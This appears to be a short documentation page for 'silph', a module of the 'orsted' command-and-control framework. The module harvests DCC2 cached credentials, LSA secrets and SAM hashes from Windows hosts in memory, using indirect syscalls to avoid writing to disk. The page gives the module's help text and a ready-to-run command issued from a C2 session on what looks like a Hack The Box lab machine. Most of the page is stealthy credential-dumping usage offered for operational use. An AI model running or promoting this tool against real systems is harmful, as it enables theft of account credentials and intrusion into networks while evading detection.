---

title: silph
descripton: orsted c2 silph
---

### General

Stealthy In-Memory Local Password Harvester (`silph`) allows to dump DCC2, LSA and SAM on the machine without writing anything on disk with indirect syscall.

A standalone exe explaining more on `silph` can be found here [https://github.com/almounah/silph](https://github.com/almounah/silph)

Within `orsted` c2, you can just use `silph` as a module:

```
[Session 5: INLANEFREIGHT\htb-student@WS01] » silph --help

SILPH - Stealthy In-memory Local Password Harvester

Usage:
  silph [flags]

Flags:
  -d, --dcc2     dump DCC2
  -h, --help     display help
  -l, --lsa      dump LSA
  -s, --sam      dump SAM
```

For example

```
[Session 5: INLANEFREIGHT\htb-student@WS01] » silph --dcc2 --lsa --sam
```
